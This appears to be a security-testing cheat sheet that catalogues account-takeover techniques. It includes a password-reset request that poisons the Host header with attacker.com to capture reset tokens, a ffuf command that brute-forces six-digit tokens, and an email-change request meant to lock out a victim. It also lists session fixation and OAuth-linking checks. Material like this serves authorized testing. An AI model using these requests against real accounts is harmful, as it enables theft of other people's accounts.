## ATO -- Account Takeover (Complete Taxonomy)

### Path 1: Password Reset Poisoning (Host Header Injection)
```bash
POST /forgot-password
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
email=<EMAIL-REDACTED>
# If reset link = https://attacker.com/reset?token=XXXX -> ATO
# Also try: X-Forwarded-Host, X-Host, X-Forwarded-Server
```

### Path 2: Reset Token in Referrer Leak
After clicking reset link, if page loads external resources -> token in Referer header to external domain.

### Path 3: Predictable / Weak Reset Tokens
```bash
# If token < 16 hex chars or numeric only -> brute-forceable
ffuf -u "https://target.com/reset?token=FUZZ" -w <(seq -w 000000 999999) -fc 404 -t 50
```

### Path 4: Token Not Expiring / Reuse
Request token -> wait 2 hours -> use it -> still works? Request token #1 -> request token #2 -> use token #1 -> still works?

### Path 5: Email Change Without Re-Authentication
```bash
PUT /api/user/email
{"new_email": "<EMAIL-REDACTED>"}
# If no current_password required -> attacker changes email -> locks out victim
```

### Path 6: OAuth Account Linking Abuse
Can you link an OAuth account from a different email to an existing account?

### Path 7: Session Fixation
GET /login -> note Set-Cookie session=XYZ -> Log in -> does session ID change? If not = fixation.

